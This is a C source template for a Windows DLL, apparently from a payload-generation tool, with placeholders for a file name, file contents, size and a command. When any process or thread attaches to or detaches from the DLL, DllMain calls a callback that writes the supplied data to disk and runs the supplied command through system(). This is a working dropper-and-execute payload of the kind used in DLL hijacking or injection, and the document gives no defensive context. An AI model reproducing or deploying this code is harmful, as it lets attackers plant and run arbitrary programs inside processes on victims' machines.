#include <stdio.h>
#include <windows.h>

#ifdef BUILD_DLL
    #define DLL_EXPORT __declspec(dllexport)
#else
    #define DLL_EXPORT __declspec(dllimport)
#endif

BOOL running = FALSE;

void DLL_EXPORT initCallback()
{	
    if(!running) {
      CHAR filename[] = "{{filename}}";
      CHAR data[] = "{{data}}";
      DWORD dwSize = {{size}};
      DWORD dwWritten = 0;
      HANDLE hFile = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
      if(hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, data, dwSize, &dwWritten, NULL);
        CloseHandle(hFile);
        system("{{cmd}}");
      }
      running = TRUE;
    }

}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
			    initCallback();
            break;

        case DLL_PROCESS_DETACH:
			      initCallback();
            break;

        case DLL_THREAD_ATTACH:
			      initCallback();
            break;

        case DLL_THREAD_DETACH:
			      initCallback();
            break;
    }
    return TRUE;
}
